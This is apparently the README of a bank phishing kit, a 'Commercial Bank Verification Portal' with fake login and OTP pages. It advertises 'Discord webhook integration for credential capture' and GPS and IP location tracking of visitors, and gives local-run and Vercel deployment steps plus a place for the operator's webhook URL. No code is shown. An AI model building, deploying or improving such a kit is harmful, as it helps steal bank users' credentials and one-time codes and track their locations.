# Commercial Bank Verification Portal

A mobile-first responsive web application for bank verification with Discord integration.

## Features

- ✅ Mobile-first responsive design
- ✅ Splash screen with logo animation
- ✅ Login and OTP verification
- ✅ Discord webhook integration for credential capture
- ✅ Location tracking (GPS + IP fallback)
- ✅ Beautiful and elegant UI

## Quick Start

### Local Development

1. Install Node.js (if not installed): https://nodejs.org
2. Start the server:
   ```bash
   node server.js
   ```
   Or double-click `start-server.bat`
3. Open in browser: `http://localhost:8000/splash.html`

### Deploy to Vercel

1. Push to GitHub
2. Go to https://vercel.com/new
3. Import from GitHub
4. Deploy!

## Configuration

### Discord Webhook

Update `discord-config.js` and `api/discord.js` with your Discord webhook URL:
- Get webhook from: Discord → Server Settings → Integrations → Webhooks

## Project Structure

```
├── index.html          # Home page
├── login.html          # Login page
├── otp.html            # OTP verification page
├── splash.html         # Splash screen
├── transition.html     # Transition screen
├── css/                # Stylesheets
├── js/                 # JavaScript files
├── api/                # Server API (for Vercel)
├── assets/             # Images and assets
└── server.js           # Local development server
```

## Technologies

- HTML5
- CSS3
- JavaScript (ES6+)
- Node.js (for local server)
- Discord Webhooks API

## License

Private project

